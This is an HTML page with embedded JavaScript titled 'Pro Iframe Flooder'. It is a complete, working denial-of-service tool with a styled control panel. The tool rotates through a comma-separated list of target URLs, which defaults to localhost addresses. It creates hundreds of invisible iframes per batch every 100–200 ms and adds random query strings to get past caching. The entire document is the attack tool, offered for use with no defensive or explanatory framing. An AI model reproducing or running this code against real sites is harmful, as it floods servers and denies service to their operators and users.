<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Pro Iframe Flooder</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #0d0d0d;
      color: #ffffff;
      text-align: center;
      padding: 30px;
    }
    input, select, button {
      margin: 8px;
      padding: 12px;
      font-size: 16px;
      border-radius: 8px;
      border: none;
    }
    input, select {
      background: #1f1f1f;
      color: #eee;
      width: 260px;
    }
    button {
      background-color: #4CAF50;
      color: white;
      cursor: pointer;
      transition: 0.3s;
    }
    button.stop {
      background-color: #f44336;
    }
    button:hover {
      opacity: 0.9;
    }
    #status {
      margin-top: 20px;
      font-size: 18px;
      font-weight: bold;
      color: #03dac6;
    }
    #iframeContainer {
      display: none;
    }
  </style>
</head>
<body>

  <h1>ðŸ”¥ Pro Iframe Flooder ðŸ”¥</h1>

  <div>
    <label for="targets">Targets (comma separated):</label><br>
    <input type="text" id="targets" value="https://127.0.0.1/,https://localhost/,https://0.0.0.0/"><br>

    <input type="number" id="minIframes" placeholder="Min Iframes per batch" value="300" min="1"><br>
    <input type="number" id="maxIframes" placeholder="Max Iframes per batch" value="500" min="1"><br>

    <input type="number" id="minInterval" placeholder="Min Spawn Interval (ms)" value="100" min="10"><br>
    <input type="number" id="maxInterval" placeholder="Max Spawn Interval (ms)" value="200" min="10"><br>

    <input type="number" id="autoStop" placeholder="Auto Stop After (seconds)" value="40" min="5"><br>

    <input type="number" id="startDelay" placeholder="Start Delay (seconds)" value="0" min="0"><br>

    <label for="theme">Theme:</label>
    <select id="theme">
      <option value="dark">Dark</option>
      <option value="light">Light</option>
    </select><br>

    <label for="extremeMode">Extreme Mode:</label>
    <input type="checkbox" id="extremeMode"><br>

    <label for="playSound">Play Sound:</label>
    <input type="checkbox" id="playSound"><br>
  </div>

  <button onclick="startFlood()">Start Pro Flood</button>
  <button class="stop" onclick="stopFlood()">Stop Flood</button>

  <div id="status">Status: Ready</div>
  <div id="iframeContainer"></div>

  <audio id="beep" src="beep.mp3"></audio>

  <script>
    let intervalId = null;
    let stopTimeoutId = null;
    let isFlooding = false;
    let targetList = [];
    let targetIndex = 0;

    function randomBetween(min, max) {
      return Math.floor(Math.random() * (max - min + 1)) + min;
    }

    function playSound() {
      if (document.getElementById('playSound').checked) {
        document.getElementById('beep').play();
      }
    }

    function changeTheme() {
      const theme = document.getElementById('theme').value;
      if (theme === 'light') {
        document.body.style.backgroundColor = '#f4f7fc';
        document.body.style.color = '#333';
      } else {
        document.body.style.backgroundColor = '#0d0d0d';
        document.body.style.color = '#ffffff';
      }
    }

    function startFlood() {
      if (isFlooding) return;
      isFlooding = true;

      const minIframes = parseInt(document.getElementById('minIframes').value) || 300;
      const maxIframes = parseInt(document.getElementById('maxIframes').value) || 500;
      const minInterval = parseInt(document.getElementById('minInterval').value) || 100;
      const maxInterval = parseInt(document.getElementById('maxInterval').value) || 200;
      const autoStopSeconds = parseInt(document.getElementById('autoStop').value) || 40;
      const startDelaySeconds = parseInt(document.getElementById('startDelay').value) || 0;

      targetList = document.getElementById('targets').value.split(',').map(t => t.trim());
      if (targetList.length === 0) {
        alert("Please enter at least one target URL.");
        return;
      }
      targetIndex = 0;

      document.getElementById('status').innerText = `Status: Flooding in progress...`;

      setTimeout(function() {
        function floodBatch() {
          if (!isFlooding) return;

          const iframeCount = randomBetween(minIframes, maxIframes);
          const target = targetList[targetIndex] + "?rand=" + Math.random();

          const container = document.getElementById('iframeContainer');
          for (let i = 0; i < iframeCount; i++) {
            const iframe = document.createElement('iframe');
            iframe.src = target;
            iframe.style.width = "0px";
            iframe.style.height = "0px";
            iframe.style.border = "none";
            container.appendChild(iframe);
          }

          document.getElementById('status').innerText = `Flooded ${iframeCount} iframes to ${target}`;

          targetIndex = (targetIndex + 1) % targetList.length;

          const nextInterval = randomBetween(minInterval, maxInterval);
          intervalId = setTimeout(floodBatch, nextInterval);
        }

        floodBatch();

        stopTimeoutId = setTimeout(() => {
          stopFlood();
        }, autoStopSeconds * 1000);
      }, startDelaySeconds * 1000);

      playSound();
    }

    function stopFlood() {
      clearTimeout(intervalId);
      clearTimeout(stopTimeoutId);
      isFlooding = false;
      document.getElementById('iframeContainer').innerHTML = "";
      document.getElementById('status').innerText = "Status: Flood stopped.";
    }

    // Change theme when the page loads
    window.onload = function() {
      changeTheme();
      document.getElementById('theme').addEventListener('change', changeTheme);
    };
  </script>

</body>
</html>
